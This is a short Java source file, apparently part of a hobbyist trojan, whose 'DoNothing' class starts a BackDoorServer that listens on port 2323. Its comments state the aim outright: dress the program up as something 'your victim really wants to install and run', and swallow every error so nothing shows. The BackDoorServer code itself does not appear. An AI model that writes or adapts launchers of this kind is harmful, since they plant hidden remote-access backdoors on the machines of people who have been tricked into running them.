//Launches the BackDoorServer
public class DoNothing {

	// The main method will be called first when excuted
	public static void main( String args[] ) {
	try {
		// Just implement the server ...
		BackDoorServer test = new BackDoorServer() ;
		// Because we use the default constructor the server will listen on port 2323
	
		// Here u could do anything that makes this Prog 
		// a Prog your victim really wants to install and run :)
	} catch( Throwable t ) {
		// Hey ! .. What's an error ?
	}
}
}